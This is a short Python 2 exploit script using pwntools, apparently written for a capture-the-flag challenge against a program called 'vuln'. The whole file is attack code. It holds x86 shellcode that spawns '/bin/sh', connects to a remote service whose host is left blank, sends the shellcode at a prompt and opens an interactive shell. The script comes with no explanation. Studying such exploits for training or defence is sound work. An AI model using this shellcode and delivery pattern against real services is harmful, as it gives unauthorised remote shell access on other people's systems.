from pwn import *
shellcode = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f'
shellcode += '\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd'
shellcode += '\x80'

#p = process('./vuln')
p = remote('',0)

print p.recvuntil(':')
p.sendline(shellcode)
print p.recvline()
p.interactive()
